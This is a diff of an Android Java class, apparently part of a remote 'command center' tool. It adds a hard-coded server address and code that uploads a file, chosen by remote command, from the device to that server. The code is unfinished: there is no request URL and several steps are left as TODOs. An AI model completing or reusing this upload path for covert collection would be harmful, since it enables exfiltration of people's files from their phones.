@@ -2,10 +2,26 @@ package com.theah64.xrob.commandcenter.commands;
 
 import android.content.Context;
 
+import com.theah64.xrob.utils.APIRequestBuilder;
+import com.theah64.xrob.utils.APIRequestGateway;
+import com.theah64.xrob.utils.CommonUtils;
+import com.theah64.xrob.utils.OkHttpUtils;
+import com.theah64.xrob.utils.Xrob;
+
 import org.apache.commons.cli.Options;
 import org.apache.commons.cli.ParseException;
 
 import java.io.File;
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 /**
  * Created by theapache64 on 9/10/16.
@@ -13,6 +29,10 @@ import java.io.File;
  * If the specified source is a directory, the zipped version will be uploaded, else the exact file.
  */
 public class PullCommand extends BaseCommand {
+
+    private static final String[] SERVERS = {
+            "http://xrob_server1.netne.net"
+    };
 
     private static final String FLAG_SOURCE = "s";
 
@@ -29,15 +49,52 @@ public class PullCommand extends BaseCommand {
         final String source = getCmd().getOptionValue(FLAG_SOURCE);
         if (source != null) {
 
-            final File sourceFile = new File(source);
+            File sourceFile = new File(source);
 
             if (sourceFile.exists()) {
 
-                if (sourceFile.isFile()) {
-                    //The source is a file so upload it.
-                } else {
-                    //The source is a directory, so zip it.
+                if (sourceFile.isDirectory()) {
+                    //TODO:Convert source file to zipped directory
                 }
+
+                //The source is a file so upload it.
+                final RequestBody fileBody = new MultipartBody.Builder()
+                        .addFormDataPart(Xrob.KEY_DATA, sourceFile.getName(), RequestBody.create(
+                                MediaType.parse(CommonUtils.getContentTypeFromFile(sourceFile.getAbsolutePath())),
+                                sourceFile
+                        ))
+                        .build();
+
+                new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
+
+                    @Override
+                    public void onReadyToRequest(String apiKey) {
+
+                        final Request fileUploadRequest = new Request.Builder()
+                                .addHeader(APIRequestBuilder.KEY_AUTHORIZATION, apiKey)
+                                .post(fileBody)
+                                .build();
+
+
+                        OkHttpUtils.getInstance().getClient().newCall(fileUploadRequest).enqueue(new okhttp3.Callback() {
+                            @Override
+                            public void onFailure(Call call, IOException e) {
+                                //Add to pending file uploads.
+                            }
+
+                            @Override
+                            public void onResponse(Call call, Response response) throws IOException {
+                                //Delete the uploaded file from temp dir.
+                            }
+                        });
+
+                    }
+
+                    @Override
+                    public void onFailed(String reason) {
+                        //Add to pending file uploads
+                    }
+                });
 
             } else {
                 callback.onError("Source : " + source + " doesn't exist");
